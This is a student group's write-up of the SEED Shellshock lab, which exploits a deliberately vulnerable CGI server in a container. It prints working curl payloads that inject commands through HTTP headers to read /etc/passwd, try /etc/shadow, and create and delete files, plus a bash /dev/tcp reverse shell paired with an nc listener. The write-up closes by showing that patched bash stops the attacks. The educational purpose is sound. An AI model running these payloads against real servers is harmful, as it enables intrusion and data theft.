# SHELLSHOCK ATTACK LAB
## SEED Lab #1

## Identification
- **Group nº3**
    - **José Rodrigues** : 201708806
    - **Paulo Ribeiro** : 201806505
    - **Pedro Ferreira** : 201806506

## Task 1:

- A Shellshock attack happens when commands that are concatenated to the end of function definitions stored in the values of environment variables are unintentionally executed, allowing the attacker to execute arbitrary commands and gain unauthorized access to services.

- Example of one such attack:
```bash 
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
- Observed results: 
    - (In the vulnerable shell, the trailing _echo_ command runs, outputting "vulnerable")

![](https://i.imgur.com/cAU0z4q.png)

## Task 2:

#### Task 2.A:

- By accessing the URL www.seedlab-shellshock.com/cgi-bin/getenv.cgi in a browser, the window presents the environment variables in the current process.
- Using the HTTP Header Live Firefox extension, we manage to see the environment variables that are set by the browser.

- Comparing the results, we can verify that the environment variables that are set by the browsers are the variables prefixed by *HTTP_* which in this case are *Host*, *User-Agent*, *Accept*, *Accept-Language*, *Accept-Encoding*, *Connection* and *Upgrade-Insecure_Requests*.

![](https://i.imgur.com/UA3SnTY.png)

#### Task 2.B:

- Using curl, we can control some of the fields in an HTTP request. Some of these are the following:
    - Using **-A**, we can modify the environment variable **HTTP_USER_AGENT**
    - Using **-e**, we can modify the environment variable **HTTP_REFERER**
    - Using **-H**, we can create new extra headers and set their corresponding values.
        - For example, running the following command will create an extra header called **HTTP_X_FIRST_NAME** and set its value to *Joe*:
```bash
curl -H "X-First-Name: Joe" -v www.seedlab-shellshock.com/cgi-bin/getenv.cgi
```

- Based on this experiment, we can verify that all three options allow us to inject arbitrary data into the environment variables. But the **-H** option would be the most interesting as it enables us to add, replace or remove any number of new environment variables.

## Task 3:

In the following subtasks, we launched some Shellshock attacks, using the three different approaches described in the last task, to achieve the four objectives proposed.

#### Task 3.A:

```bash
curl -A "() { :;}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi
 ```
 
![](https://i.imgur.com/PkYChfO.png)

#### Task 3.B:

```bash
curl -e "() { :;}; echo Content_type: text/plain; echo; /bin/id" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi
 ```
![](https://i.imgur.com/pjELFZi.png)


#### Task 3.C:

```bash
curl -H "Target: () { :;}; echo Content_type: text/plain; echo; /bin/touch /tmp/hack.txt" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi

curl -H "Target: () { :;}; echo Content_type: text/plain; echo; /bin/ls /tmp" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi
 ```

![](https://i.imgur.com/WwbFeCZ.png)

#### Task 3.D:

```bash
curl -H "Target: () { :;}; echo Content_type: text/plain; echo; /bin/rm /tmp/hack.txt" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi
```


![](https://i.imgur.com/KNCNzI1.png)


#### Question 1

- We tried to access the file /etc/shadow using the following command, which redirects the writing of the error message to the terminal:

```bash
curl -H "Target: () { :;}; echo Content_type: text/plain; echo; /bin/cat /etc/shadow 2>&1" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

- We verified that an error occurs, accusing that permission was denied.
- After some searching, we concluded that this file can only be accessed using root permissions.
- However, as we can see in task 3.B, our UID is 33, so we're not executing the commands as root, which would have the UID 0.

- **Answer:** No, we are not able to steal the content of the shadow file.

![](https://i.imgur.com/6roS3i3.png)

#### Question 2

- To accomplish this attack, we need to try to fit our attack payload in the URL, as an HTTP GET request, and to that effect, we tried with, and without encoding, and these are a couple of commands we tried (and their encoded counterparts):

```bash
() { :;}; echo Content_type: text/plain; echo; /bin/cat /etc/passwd
()%20%7B%20%3A%3B%7D%3B%20echo%20Content_type%3A%20text%2Fplain%3B%20echo%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd

() { :;}; /bin/cat /etc/passwd
()%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd
```

without encode:
![](https://i.imgur.com/G6QaDqN.png)

with '':
![](https://i.imgur.com/yNlxcOu.png)

encoded:
![](https://i.imgur.com/2iMmOFH.png)

- **Answer:** After many attempts, we realized that no, this method cannot be used to launch the Shellshock attack. This happens because we need spaces in the command, which cannot be translated to the URL, and even with encoding, it does not function as intended, as the QUERY_STRING variable takes the encoded value as a raw string.

## Task 4:

- To get a **Reverse Shell** open in the target machine, we have to first, in the attacker machine, open a TCP server that will listen for the connection we will engage in the target machine, that will later transmit the shell inputs and outputs.
- We do that in the following way:
```bash
nc -nv -l 9090
```

- After that, we now have to use the shellshock vulnerability to make the target machine (10.9.0.80) open a new shell that will send its outputs and receive its inputs from the TCP server in the attacker machine (10.9.0.1), and we can accomplish that with the following command:
```bash
curl -A "() { :;}; echo Content_type: text/plain; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1" -v www.seedlab-shellshock.com/cgi-bin/vul.cgi
```

- We ended up successfully opening a Reverse Shell:

![](https://i.imgur.com/ACgEIqL.png)

## Task 5:

- We started by changing the first line of the CGI programs in order to use the patched bash (/bin/bash), without the shellshock vulnerability. To change the CGI files in the container, we run the commands:

```bash
docker cp vul.cgi 53c31041a33c:/usr/lib/cgi-bin
docker cp getenv.cgi 53c31041a33c:/usr/lib/cgi-bin
```

- Now we redo Task 3 to analyze the results. As we can see, none of the attacks worked, since /bin/bash is patched against this vulnerability.

#### Task 5.A:

![](https://i.imgur.com/pLKvfPy.png)

#### Task 5.B:

![](https://i.imgur.com/ol20BtV.png)

#### Task 5.C:

![](https://i.imgur.com/MBg5jqL.png)
![](https://i.imgur.com/MQWyp40.png)

#### Task 5.D:

![](https://i.imgur.com/LzjXi7B.png)
